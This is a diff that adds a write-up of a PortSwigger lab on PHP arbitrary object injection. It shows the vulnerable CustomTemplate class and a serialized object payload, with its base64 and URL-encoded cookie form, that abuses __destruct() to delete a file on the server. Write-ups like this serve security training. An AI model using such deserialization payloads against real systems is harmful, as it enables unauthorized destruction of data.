@@ -37,3 +37,65 @@ Write-up:
 
 3. Re-encoding it, setting as session cookie and deleting our account allows us to solve the lab.
 
+## Arbitrary object injection in PHP
+
+[Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
+
+Write-up:
+
+1. Looking at the source code of `/my-account` we find the following: `<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->`
+Attempting to use a GET request to get that file returns nothing. We can use the
+hint given and access `libs/CustomTemplate.php~` to retrieve the source code.
+
+    ```php
+    <?php
+
+    class CustomTemplate {
+        private $template_file_path;
+        private $lock_file_path;
+
+        public function __construct($template_file_path) {
+            $this->template_file_path = $template_file_path;
+            $this->lock_file_path = $template_file_path . ".lock";
+        }
+
+        private function isTemplateLocked() {
+            return file_exists($this->lock_file_path);
+        }
+
+        public function getTemplate() {
+            return file_get_contents($this->template_file_path);
+        }
+
+        public function saveTemplate($template) {
+            if (!isTemplateLocked()) {
+                if (file_put_contents($this->lock_file_path, "") === false) {
+                    throw new Exception("Could not write to " . $this->lock_file_path);
+                }
+                if (file_put_contents($this->template_file_path, $template) === false) {
+                    throw new Exception("Could not write to " . $this->template_file_path);
+                }
+            }
+        }
+
+        function __destruct() {
+            // Carlos thought this would be a good idea
+            if (file_exists($this->lock_file_path)) {
+                unlink($this->lock_file_path);
+            }
+        }
+    }
+
+    ?>
+    ```
+
+2. We can use the ``__destruct()`` function to solve the lab: 
+`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
+
+    Setting the `lock_file_path` attribute to `/home/carlos/morale.txt` allows us to
+    delete that file once the script is executed (by a GET request to `/libs/CustomTemplate.php`).
+
+3. After base-64 and URL encoding (in that order) the object and setting it as the session cookie, we can make
+the GET request to solve the lab:   `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D`
+
+
